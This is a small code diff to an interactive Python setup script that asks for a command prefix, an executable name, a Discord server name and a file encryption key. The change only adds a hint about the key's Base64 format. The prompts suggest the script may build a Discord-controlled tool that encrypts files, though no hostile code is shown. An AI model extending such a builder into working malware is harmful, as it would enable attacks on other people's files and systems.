@@ -19,6 +19,7 @@ while True:
     prefix = input("[i] Enter the desired prefix>> ")
     exe_name = input("[i] Enter name of the compiled executable file>> ")
     server_name = input("[i] Enter name of the discord server>> ")
+    print("\n(NOTE: The key must be exactly 32 random bytes, encoded in Base64 URL-safe format.)")
     cryp_key = input("[i] Enter the key for file encryption/decryption>> ")
 
     
